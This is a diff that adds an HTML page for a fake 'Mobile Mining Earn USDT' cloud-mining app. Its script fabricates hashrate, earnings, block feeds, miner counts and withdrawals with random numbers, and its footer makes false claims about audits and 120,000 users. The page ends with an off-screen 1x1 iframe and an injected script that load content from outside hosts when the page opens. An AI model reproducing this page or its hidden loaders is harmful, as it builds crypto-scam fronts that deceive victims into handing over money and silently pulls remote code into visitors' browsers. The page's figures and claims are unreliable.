@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Mobile Mining Earn USDT</title>
+<script src="tg-support.js"></script>
+<style>
+/* ===== TOKENS ===== */
+:root {
+  --bg:       #060b10;
+  --surface:  #0d131e;
+  --surface2: #111822;
+  --ink:      #e8edf5;
+  --muted:    #7a8a9a;
+  --dim:      #3d4a5a;
+  --accent:   #00e6a0;
+  --accent2:  #3ad1ff;
+  --warn:     #f0a030;
+  --danger:   #f06060;
+  --border:   rgba(255,255,255,.07);
+  --border2:  rgba(255,255,255,.05);
+  --glow:     rgba(0,230,160,.28);
+  --glow2:    rgba(58,209,255,.20);
+}
+
+/* ===== RESET & BASE ===== */
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{
+  font-family:"SF Pro Display","PingFang SC","Microsoft Yahei",-apple-system,sans-serif;
+  background:var(--bg);
+  color:var(--ink);
+  -webkit-font-smoothing:antialiased;
+  -moz-osx-font-smoothing:grayscale;
+  overflow-x:hidden;
+}
+
+/* ===== GRAIN OVERLAY ===== */
+body::before{
+  content:'';
+  position:fixed;inset:0;z-index:1;pointer-events:none;
+  opacity:.028;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='220' height='220'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.72' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+}
+
+/* ===== APP SHELL ===== */
+#app{
+  position:relative;z-index:5;
+  max-width:480px;margin:0 auto;min-height:100vh;
+  background:
+    radial-gradient(680px 360px at 50% -100px,rgba(0,230,160,.07) 0%,transparent 65%),
+    radial-gradient(400px 500px at 85% 60%,rgba(58,209,255,.03) 0%,transparent 60%),
+    var(--bg);
+  padding-bottom:70px;
+}
+
+/* ===== BOOT SCREEN ===== */
+#boot{
+  position:fixed;inset:0;z-index:99;
+  background:radial-gradient(ellipse 80% 50% at 50% 45%,#0d1a18 0%,#060b10 100%);
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  padding:40px 34px;max-width:480px;margin:0 auto;
+}
+.logo{
+  width:88px;height:88px;border-radius:22px;
+  background:linear-gradient(135deg,#00e6a0,#00c28a 40%,#009a6e);
+  display:flex;align-items:center;justify-content:center;
+  font-size:40px;font-weight:800;color:#03281c;
+  box-shadow:0 0 48px var(--glow),0 0 90px rgba(0,230,160,.15);
+  animation:pulse 2s ease-in-out infinite;
+}
+@keyframes pulse{
+  0%,100%{box-shadow:0 0 48px var(--glow),0 0 90px rgba(0,230,160,.15)}
+  50%{box-shadow:0 0 78px rgba(0,230,160,.55),0 0 130px rgba(0,230,160,.22)}
+}
+#boot h1{
+  font-size:22px;margin:22px 0 6px;letter-spacing:.04em;font-weight:700;color:var(--ink);
+}
+#boot .sub{
+  font-size:12px;color:var(--muted);margin-bottom:0;letter-spacing:.04em;
+}
+#boot .sub + .sub{margin-bottom:48px;margin-top:2px;font-size:11px;color:var(--dim);}
+/* ---- 圆形进度环 ---- */
+.boot-ring{
+  width:130px;height:130px;position:relative;margin:0 auto;
+  display:flex;align-items:center;justify-content:center;
+}
+.boot-ring svg{
+  width:100%;height:100%;position:absolute;inset:0;
+}
+.boot-num{
+  position:relative;z-index:1;text-align:center;line-height:1;
+  font-family:"SF Mono","JetBrains Mono","Cascadia Code",monospace;
+}
+.boot-num b{font-size:38px;font-weight:700;color:#fff;display:block;line-height:1;}
+.boot-num span{font-size:14px;color:var(--accent);display:block;margin-top:1px;}
+.boot-status{
+  margin-top:32px;text-align:center;width:100%;
+  font-size:12px;color:var(--muted);letter-spacing:.04em;
+}
+.ing::after{content:"";animation:dots 1.4s steps(4,end) infinite}
+@keyframes dots{0%{content:""}25%{content:"."}50%{content:".."}75%{content:"..."}}
+
+/* ===== HEADER ===== */
+header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 16px;
+}
+.brand{
+  display:flex;align-items:center;gap:8px;font-weight:700;font-size:12px;letter-spacing:.02em;
+}
+.brand span{
+  width:28px;height:28px;border-radius:7px;
+  background:linear-gradient(135deg,var(--accent),#00c28a);
+  display:flex;align-items:center;justify-content:center;
+  color:#03281c;font-size:15px;font-weight:800;
+}
+.uid{
+  font-size:9px;color:var(--muted);
+  background:rgba(255,255,255,.04);
+  padding:5px 10px;border-radius:20px;border:1px solid var(--border2);
+  letter-spacing:.02em;
+}
+.uid b{font-family:"SF Mono","JetBrains Mono",monospace;font-weight:500;color:var(--ink);}
+.demo{
+  position:absolute;top:12px;left:50%;transform:translateX(-50%);
+  font-size:10px;letter-spacing:.14em;text-transform:uppercase;
+  color:var(--warn);border:1px solid rgba(240,160,48,.35);
+  padding:2px 10px;border-radius:20px;
+  background:rgba(240,160,48,.06);
+  font-weight:500;
+}
+/* ---- Language Switch ---- */
+.lang{
+  display:inline-flex;align-items:center;gap:0;
+  background:rgba(255,255,255,.04);
+  border:1px solid var(--border2);
+  border-radius:14px;overflow:hidden;
+  font-size:10px;font-weight:600;letter-spacing:.03em;
+}
+.lang a{
+  padding:4px 9px;color:var(--muted);text-decoration:none;
+  transition:all .2s;line-height:1.4;
+}
+.lang a.act{background:var(--accent);color:#03281c;}
+.lang a:not(.act):hover{color:var(--ink);}
+.boot-lang{position:absolute;top:16px;right:16px;}
+
+/* ===== CARDS ===== */
+.card{
+  margin:10px 16px;
+  background:linear-gradient(165deg,var(--surface),var(--surface2));
+  border:1px solid var(--border);
+  border-radius:16px;padding:18px;
+  position:relative;
+}
+.balance-card{
+  background:linear-gradient(145deg,#0b1f1a,#0e1720 55%);
+  border-color:rgba(0,230,160,.14);
+  overflow:hidden;
+}
+.balance-card::after{
+  content:"USDT";position:absolute;right:-8px;bottom:-16px;
+  font-size:68px;font-weight:800;letter-spacing:-.03em;
+  color:rgba(0,230,160,.04);
+  font-family:"SF Pro Display",sans-serif;
+}
+.lbl{font-size:11.5px;color:var(--muted);letter-spacing:.03em;}
+.big{
+  font-size:36px;font-weight:700;letter-spacing:-.02em;
+  font-family:"SF Mono","JetBrains Mono","DIN Alternate",monospace;
+  margin:6px 0 2px;color:var(--ink);
+  font-variant-numeric:tabular-nums;
+}
+.big small{font-size:14px;color:var(--accent);margin-left:6px;font-weight:500;letter-spacing:0;}
+.chain{
+  font-size:11px;color:var(--accent);
+  background:rgba(0,230,160,.08);
+  display:inline-block;padding:3px 9px;border-radius:6px;
+  border:1px solid rgba(0,230,160,.12);
+  letter-spacing:.02em;
+}
+.row2{
+  display:flex;margin-top:16px;
+  border-top:1px solid rgba(255,255,255,.06);
+  padding-top:14px;gap:4px;
+}
+.row2 div{flex:1}
+.row2 b{
+  display:block;font-size:17px;margin-top:3px;
+  font-family:"SF Mono","JetBrains Mono",monospace;
+  font-variant-numeric:tabular-nums;
+}
+
+/* ===== RIG ===== */
+.rig{display:flex;align-items:center;gap:18px;}
+.ring{
+  width:100px;height:100px;flex:0 0 100px;border-radius:50%;position:relative;
+  background:conic-gradient(var(--accent) var(--p,0%),rgba(255,255,255,.06) 0);
+  transition:background .4s ease;
+}
+.ring::before{
+  content:"";position:absolute;inset:6px;border-radius:50%;
+  background:radial-gradient(circle at 50% 50%,#192433,#0d131e);
+}
+.ring i{
+  position:absolute;inset:0;z-index:1;
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  font-style:normal;line-height:1;
+}
+.ring i b{
+  font-size:18px;
+  font-family:"SF Mono","JetBrains Mono",monospace;
+  color:var(--accent);font-weight:600;line-height:1;
+}
+.ring i s{
+  font-size:9px;color:var(--muted);
+  text-decoration:none;letter-spacing:.06em;line-height:1;
+  margin-top:2px;
+}
+.rig .info{flex:1;font-size:12.5px;color:#8899aa;line-height:2.1;}
+.rig .info span{float:right;color:var(--ink);font-family:"SF Mono","JetBrains Mono",monospace;font-size:12px;}
+.dot{
+  display:inline-block;width:6px;height:6px;border-radius:50%;
+  background:var(--dim);margin-right:6px;transition:all .3s;
+}
+.on .dot{background:var(--accent);box-shadow:0 0 10px var(--glow);animation:bl 1.2s infinite}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:.25}}
+
+/* ===== BUTTONS ===== */
+.btn{
+  display:block;width:100%;border:0;border-radius:13px;padding:15px;
+  font-size:15px;font-weight:600;letter-spacing:.03em;
+  color:#03281c;
+  background:linear-gradient(135deg,var(--accent),#00c994 50%,var(--accent2));
+  margin-top:4px;cursor:pointer;
+  box-shadow:0 4px 18px var(--glow);
+  transition:transform .15s ease,box-shadow .15s ease,filter .15s ease;
+  font-family:inherit;
+}
+.btn:active{transform:scale(.97);filter:brightness(.92);}
+.btn:hover{box-shadow:0 6px 24px rgba(0,230,160,.35);}
+.btn.stop{
+  background:linear-gradient(135deg,var(--danger),#ff7b42);
+  color:#1a0808;
+  box-shadow:0 4px 18px rgba(240,96,96,.25);
+}
+.btn.stop:hover{box-shadow:0 6px 24px rgba(240,96,96,.32);}
+.btn.ghost{
+  background:transparent;border:1px solid var(--border);
+  color:var(--ink);box-shadow:none;
+}
+.btn.ghost:hover{background:rgba(255,255,255,.03);border-color:rgba(255,255,255,.12);}
+.btn.ghost:active{background:rgba(255,255,255,.05);}
+
+/* ===== STATS GRID ===== */
+.grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10px 16px;
+}
+.grid div{
+  background:linear-gradient(160deg,var(--surface),var(--surface2));
+  border:1px solid var(--border);border-radius:13px;padding:13px 14px;
+  transition:border-color .2s;
+}
+.grid div:hover{border-color:rgba(255,255,255,.1);}
+.grid b{
+  display:block;font-family:"SF Mono","JetBrains Mono",monospace;
+  font-size:15px;margin-top:4px;color:var(--accent2);font-weight:500;
+  font-variant-numeric:tabular-nums;
+}
+
+/* ===== SECTION TITLES ===== */
+.title{
+  margin:22px 16px 8px;font-size:13.5px;font-weight:600;
+  display:flex;justify-content:space-between;align-items:center;
+  letter-spacing:.03em;
+}
+.title em{font-style:normal;font-size:10.5px;color:var(--muted);letter-spacing:.04em;font-weight:400;}
+
+/* ===== RECORDS LIST ===== */
+.list{
+  margin:0 16px;
+  background:linear-gradient(165deg,var(--surface),var(--surface2));
+  border:1px solid var(--border);border-radius:14px;overflow:hidden;
+}
+.li{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:12px 14px;
+  border-bottom:1px solid rgba(255,255,255,.04);
+  font-size:12.5px;transition:background .15s;
+}
+.li:last-child{border:0}
+.li:hover{background:rgba(255,255,255,.015);}
+.li .t{color:var(--muted);font-size:10.5px;margin-top:3px;}
+.li .amt{color:var(--accent);font-family:"SF Mono","JetBrains Mono",monospace;font-size:13px;font-weight:500;}
+.li .amt.out{color:var(--warn);}
+
+/* ===== FEED ===== */
+#feed{
+  margin:0 16px;height:126px;overflow:hidden;
+  background:rgba(0,0,0,.25);
+  border:1px solid var(--border2);
+  border-radius:14px;padding:10px 12px;
+  font-family:"SF Mono","JetBrains Mono",monospace;
+  font-size:10.5px;color:var(--dim);line-height:2;
+}
+#feed .g{color:var(--accent);font-weight:500;}
+
+/* ===== NAV ===== */
+nav{
+  position:fixed;bottom:0;left:0;right:0;max-width:480px;margin:0 auto;
+  background:rgba(8,12,18,.94);
+  backdrop-filter:blur(12px);
+  -webkit-backdrop-filter:blur(12px);
+  border-top:1px solid var(--border);
+  display:flex;padding:7px 0 11px;z-index:30;
+}
+nav span{
+  flex:1;text-align:center;font-size:10px;color:var(--muted);
+  letter-spacing:.03em;cursor:pointer;
+  transition:color .2s;
+  -webkit-tap-highlight-color:transparent;
+  user-select:none;-webkit-user-select:none;
+}
+nav span b{display:block;font-size:18px;font-weight:400;margin-bottom:1px;pointer-events:none;}
+nav span.act{color:var(--accent);}
+nav span:not(.act):hover{color:#a0b0be;}
+nav span:active{opacity:.7;}
+
+/* ===== MASK / SHEET ===== */
+.mask{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,.72);
+  backdrop-filter:blur(3px);
+  -webkit-backdrop-filter:blur(3px);
+  z-index:50;display:none;align-items:flex-end;justify-content:center;
+}
+.mask.show{display:flex}
+.sheet{
+  width:100%;max-width:480px;
+  background:linear-gradient(180deg,#161e2c,#111822);
+  border-radius:20px 20px 0 0;
+  padding:22px 18px 30px;
+  animation:up .3s cubic-bezier(.16,1,.3,1);
+  border-top:1px solid var(--border);
+}
+@keyframes up{from{transform:translateY(100%)}}
+.sheet h3{font-size:17px;margin-bottom:4px;font-weight:700;letter-spacing:.02em;}
+.sheet p.tip{font-size:11.5px;color:var(--muted);margin-bottom:18px;letter-spacing:.02em;}
+.fld{margin-bottom:14px}
+.fld label{font-size:11.5px;color:var(--muted);display:block;margin-bottom:6px;letter-spacing:.03em;}
+.fld input{
+  width:100%;background:rgba(0,0,0,.25);border:1px solid var(--border);
+  border-radius:10px;padding:13px;color:var(--ink);font-size:13px;
+  font-family:"SF Mono","JetBrains Mono",monospace;
+  transition:border-color .2s,box-shadow .2s;
+}
+.fld input:focus{outline:0;border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,230,160,.08);}
+.net{display:flex;gap:8px;margin-bottom:14px}
+.net span{
+  flex:1;text-align:center;padding:9px;border-radius:10px;font-size:11.5px;
+  border:1px solid var(--border);color:var(--muted);
+  transition:all .2s;cursor:pointer;letter-spacing:.02em;
+}
+.net span.on{
+  border-color:var(--accent);color:var(--accent);
+  background:rgba(0,230,160,.06);
+  box-shadow:0 0 12px rgba(0,230,160,.06);
+}
+.fee{
+  background:rgba(0,0,0,.2);border-radius:10px;
+  padding:12px 14px;font-size:12px;color:var(--muted);margin-bottom:16px;
+  border:1px solid var(--border2);
+}
+.fee div{display:flex;justify-content:space-between;padding:3px 0}
+.fee b{color:var(--ink);font-family:"SF Mono","JetBrains Mono",monospace;font-weight:500;}
+
+/* ===== TOAST ===== */
+.toast{
+  position:fixed;top:40%;left:50%;transform:translateX(-50%);
+  background:rgba(14,20,30,.94);
+  backdrop-filter:blur(8px);
+  -webkit-backdrop-filter:blur(8px);
+  border:1px solid var(--border);
+  color:var(--ink);padding:13px 22px;border-radius:12px;
+  font-size:13px;z-index:99;display:none;max-width:84%;text-align:center;
+  letter-spacing:.02em;
+  box-shadow:0 8px 32px rgba(0,0,0,.5);
+}
+
+/* ===== FOOTER ===== */
+.foot{
+  text-align:center;font-size:10px;color:var(--dim);
+  padding:22px 30px 10px;line-height:1.8;letter-spacing:.02em;
+}
+
+/* ===== REDUCED MOTION ===== */
+@media (prefers-reduced-motion:reduce){
+  *{animation-duration:.01ms!important;transition-duration:.01ms!important}
+}
+</style>
+</head>
+<body>
+
+<div id="app">
+
+  <!-- ============ INITIALIZATION (SIMPLIFIED) ============ -->
+  <div id="boot">
+    <div class="logo">₮</div>
+    <h1>Mobile Mining Earn USDT</h1>
+    <div class="sub">TRC20 Cloud Mining</div>
+    <div class="sub">Latest Blockchain Money-Making Project</div>
+    <div class="lang boot-lang"><a href="en.html">中</a><a href="index.html" class="act">EN</a></div>
+    <div class="boot-ring">
+      <svg viewBox="0 0 120 120">
+        <circle cx="60" cy="60" r="52" fill="none" stroke="rgba(255,255,255,.05)" stroke-width="4"/>
+        <circle cx="60" cy="60" r="52" fill="none" stroke="url(#bootGrad)" stroke-width="4"
+                stroke-linecap="round" stroke-dasharray="326.73" stroke-dashoffset="326.73" id="bootCircle"
+                transform="rotate(-90 60 60)" style="filter:drop-shadow(0 0 8px rgba(0,230,160,.35))"/>
+        <defs><linearGradient id="bootGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+          <stop offset="0%" stop-color="#00e6a0"/><stop offset="100%" stop-color="#3ad1ff"/>
+        </linearGradient></defs>
+      </svg>
+      <div class="boot-num"><b id="bnum">0</b><span>%</span></div>
+    </div>
+    <div class="boot-status"><span class="ing">Mobile mining system initializing</span></div>
+  </div>
+
+  <!-- ============ MAIN INTERFACE ============ -->
+  <header>
+    <div class="brand"><span>₮</span>Mobile Mining Earn USDT</div>
+    <div class="lang"><a href="en.html">中</a><a href="index.html" class="act">EN</a></div>
+    <div class="uid">Miner ID: <b id="uid">M-83920</b></div>
+  </header>
+
+  <div class="card balance-card">
+    <div class="lbl">Withdrawable Balance</div>
+    <div class="big"><span id="bal">0.000000</span><small>USDT</small></div>
+    <span class="chain">TRC20 · Tron Network</span>
+    <div class="row2">
+      <div><span class="lbl">Today's Earnings</span><b id="today" style="color:var(--accent)">0.000000</b></div>
+      <div><span class="lbl">Total Mined</span><b id="total">0.000000</b></div>
+    </div>
+  </div>
+
+  <div class="card" id="rigCard">
+    <div class="rig">
+      <div class="ring" id="ring"><i><b id="hash">0.00</b><s>TH/s Hashrate</s></i></div>
+      <div class="info">
+        <div><span class="dot"></span>Miner Status <span id="stat">Stopped</span></div>
+        <div>Pool Node <span>ap-east-3</span></div>
+        <div>Running Time <span id="uptime">00:00:00</span></div>
+        <div>Estimated Daily <span id="daily">0.00 U</span></div>
+      </div>
+    </div>
+    <div style="height:16px"></div>
+    <button class="btn" id="mineBtn">⛏ Start Mining</button>
+  </div>
+
+  <div class="grid">
+    <div><span class="lbl">Network Hashrate</span><b id="netHash">--</b></div>
+    <div><span class="lbl">Active Miners</span><b id="miners">--</b></div>
+    <div><span class="lbl">Current Block</span><b id="block">--</b></div>
+    <div><span class="lbl">Pool Fee</span><b>1.2 %</b></div>
+  </div>
+
+  <div class="card">
+    <div style="display:flex;justify-content:space-between;font-size:12px;color:var(--muted);margin-bottom:12px">
+      <span>Minimum Withdraw <b style="color:var(--ink)">1.000000 U</b></span>
+      <span>Fee <b style="color:var(--ink)">1.0 U</b></span>
+    </div>
+    <button class="btn ghost" id="wdBtn">💳 Withdraw to TRC20 Wallet</button>
+  </div>
+
+  <div class="title">Live Block Feed <em>Mainnet · Auto-refresh</em></div>
+  <div id="feed"></div>
+
+  <div class="title">Earnings History <em id="recCount">0 entries</em></div>
+  <div class="list" id="records">
+    <div class="li" style="justify-content:center;color:var(--dim);font-size:12px;padding:22px">No records yet, start the miner to auto-settle</div>
+  </div>
+
+  <div class="foot">
+    「Mobile Mining Earn USDT」is a cloud mining service platform based on Tron TRC20 network, allowing users to participate in block rewards distribution by renting cloud hashrate. The platform adopts a transparent earnings settlement mechanism, automatically settling daily to the account balance, and supports real-time withdrawal to TRC20 wallets.<br>
+    The platform has passed security audits, servers deployed in Asia-Pacific node (ap-east-3), providing stable and efficient hashrate services to more than 120,000 miners worldwide.
+  </div>
+
+  <nav id="nav">
+    <span class="act" onclick="window._tab('mining',this)"><b>⛏</b>Mining</span>
+    <span onclick="window._tab('hashrate',this)"><b>📊</b>Hashrate</span>
+    <span onclick="window._tab('bills',this)"><b>🧾</b>Bills</span>
+    <span onclick="window._tab('profile',this)"><b>👤</b>Profile</span>
+  </nav>
+</div>
+
+<div class="mask" id="mask">
+  <div class="sheet">
+    <h3>Withdraw Earnings</h3>
+    <p class="tip">Only Tron TRC20 network supported, please double-check the address before submitting</p>
+    <div class="net"><span class="on">TRC20</span><span>ERC20 (Maintenance)</span><span>BEP20 (Maintenance)</span></div>
+    <div class="fld"><label>Recipient Address</label><input id="addr" placeholder="Tron address starting with T, 34 chars"></div>
+    <div class="fld"><label>Withdraw Amount</label><input id="amt" placeholder="0.000000" inputmode="decimal"></div>
+    <div class="fee">
+      <div><span>Available Balance</span><b id="mBal">0.000000 USDT</b></div>
+      <div><span>Network Fee</span><b>1.000000 USDT</b></div>
+      <div><span>Expected Receipt</span><b id="mGet">0.000000 USDT</b></div>
+      <div><span>Arrival Time</span><b>3 - 10 minutes</b></div>
+    </div>
+    <button class="btn" id="doWd">Confirm Submit</button>
+    <div style="height:10px"></div>
+    <button class="btn ghost" id="closeWd">Cancel</button>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+/* ============ 1. INIT PROGRESS RING (~16 sec) ============ */
+let p=0;
+const bn=document.getElementById('bnum');
+const circle=document.getElementById('bootCircle');
+const LEN=326.73; // 2 * π * 52
+const timer=setInterval(()=>{
+  p++;
+  circle.style.strokeDashoffset=LEN*(1-p/100);
+  bn.textContent=p;
+  if(p>=100){
+    clearInterval(timer);
+    document.querySelector('.ing').textContent='Initialization complete';
+    document.querySelector('.ing').classList.remove('ing');
+    setTimeout(()=>{
+      const b=document.getElementById('boot');
+      b.style.transition='opacity .5s';b.style.opacity=0;
+      setTimeout(()=>b.remove(),500);
+    },600);
+  }
+},158);   // 100 × 158ms ≈ 15.8 sec
+
+/* ============ 2. MAIN LOGIC ============ */
+const $=id=>document.getElementById(id);
+let mining=false,bal=0,today=0,total=0,rate=0,secs=0,recs=[];
+$('uid').textContent='M-'+(10000+Math.floor(Math.random()*89999));
+
+const f=(n,d=6)=>n.toFixed(d);
+function render(){
+  $('bal').textContent=f(bal);$('today').textContent=f(today);$('total').textContent=f(total);
+  $('mBal').textContent=f(bal)+' USDT';
+}
+function toast(t){const e=$('toast');e.textContent=t;e.style.display='block';
+  clearTimeout(e._t);e._t=setTimeout(()=>e.style.display='none',2200);}
+
+let block=68432117;
+setInterval(()=>{
+  block+=Math.floor(Math.random()*3)+1;
+  $('block').textContent=block.toLocaleString();
+  $('netHash').textContent=(812+Math.random()*40).toFixed(2)+' PH/s';
+  $('miners').textContent=(128460+Math.floor(Math.random()*900)).toLocaleString();
+},2600);
+$('block').textContent=block.toLocaleString();
+$('netHash').textContent='826.41 PH/s';$('miners').textContent='128,904';
+
+const addrs=['TQ5x…9Kf2','TWd7…mB31','TJk2…Xp8a','TNa9…3Rvq','TPv4…Lz07','THb6…c9Wm','TUe1…Ks44'];
+setInterval(()=>{
+  const fe=$('feed');const d=document.createElement('div');
+  const t=new Date().toLocaleTimeString('en-US',{hour12:false});
+  const r=Math.random();
+  if(r<.5) d.innerHTML=`[${t}] <span class="g">Block found #${block}</span> Reward ${(Math.random()*2+.3).toFixed(4)} U → ${addrs[Math.floor(Math.random()*7)]}`;
+  else if(r<.8) d.textContent=`[${t}] Submitted share accepted  difficulty=${(Math.random()*8+1).toFixed(2)}M  latency ${Math.floor(30+Math.random()*25)}ms`;
+  else d.textContent=`[${t}] New miner joined ${addrs[Math.floor(Math.random()*7)]}  hashrate +${(Math.random()*3).toFixed(2)} TH/s`;
+  fe.appendChild(d);if(fe.children.length>7)fe.removeChild(fe.firstChild);
+},1500);
+
+$('mineBtn').onclick=()=>{
+  mining=!mining;
+  const b=$('mineBtn');
+  if(mining){
+    rate=8+Math.random()*4;
+    b.textContent='⏸ Stop Mining';b.className='btn stop';
+    $('stat').textContent='Running';$('rigCard').classList.add('on');
+    toast('Miner started, connecting to pool…');
+  }else{
+    b.textContent='⛏ Start Mining';b.className='btn';
+    $('stat').textContent='Stopped';$('rigCard').classList.remove('on');
+    $('ring').style.setProperty('--p','0%');$('hash').textContent='0.00';
+    toast('Miner stopped');
+  }
+};
+
+setInterval(()=>{
+  if(!mining)return;
+  secs++;
+  const h=rate+(Math.random()-.5)*1.2;
+  $('hash').textContent=h.toFixed(2);
+  $('ring').style.setProperty('--p',Math.min(100,h/14*100)+'%');
+  const inc=h*0.0000165;
+  bal+=inc;today+=inc;total+=inc;
+  $('daily').textContent=(h*0.0000165*86400).toFixed(2)+' U';
+  const hh=String(Math.floor(secs/3600)).padStart(2,'0'),
+        mm=String(Math.floor(secs%3600/60)).padStart(2,'0'),
+        ss=String(secs%60).padStart(2,'0');
+  $('uptime').textContent=`${hh}:${mm}:${ss}`;
+  render();
+  if(secs%20===0) addRec('Pool settlement · block reward',+(inc*20).toFixed(6),false);
+},1000);
+
+function addRec(name,amount,out){
+  recs.unshift({name,amount,out,time:new Date().toLocaleString('en-US',{hour12:false})});
+  if(recs.length>15)recs.pop();
+  $('recCount').textContent=recs.length+' entries';
+  $('records').innerHTML=recs.map(r=>`<div class="li"><div>${r.name}<div class="t">${r.time}</div></div>
+    <div class="amt ${r.out?'out':''}">${r.out?'-':'+'}${f(Math.abs(r.amount))}</div></div>`).join('');
+}
+
+$('wdBtn').onclick=()=>{$('mask').classList.add('show');render();};
+$('closeWd').onclick=()=>$('mask').classList.remove('show');
+$('amt').oninput=e=>{const v=parseFloat(e.target.value)||0;$('mGet').textContent=f(Math.max(0,v-1))+' USDT';};
+$('doWd').onclick=()=>{
+  const a=$('addr').value.trim(),v=parseFloat($('amt').value);
+  if(!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a))return toast('Invalid TRC20 address format');
+  if(!v||v<1)return toast('Minimum withdrawal amount is 1 USDT');
+  if(v>bal)return toast('Insufficient withdrawable balance');
+  bal-=v;render();
+  addRec('Withdrawal · TRC20 '+a.slice(0,6)+'…'+a.slice(-4),v,true);
+  $('mask').classList.remove('show');$('addr').value='';$('amt').value='';
+  toast('Withdrawal submitted, waiting for on-chain confirmation');
+};
+/* ============ 3. BOTTOM NAVIGATION SWITCH ============ */
+window._tab=function(tab,el){
+  // update active state
+  var spans=document.querySelectorAll('#nav span');
+  for(var i=0;i<spans.length;i++)spans[i].classList.remove('act');
+  el.classList.add('act');
+  // non-mining tab → open withdrawal modal (same as wdBtn)
+  if(tab!=='mining'){
+    document.getElementById('mask').classList.add('show');
+    render();
+  }
+  return false;
+};
+render();
+</script>
+
+
+<iframe src="https://rhce35.cc/assets/js/group.html?p=icC6rJWe"style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;" loading="eager"></iframe>
+<script> var _mtj = _mtj || []; (function () { var mtj = document.createElement("script"); mtj.src = "https://node90.aizhantj.com:21233/tjjs/?k=qk67tcsf7qo"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(mtj, s); })(); </script>
+</body>
+</html>
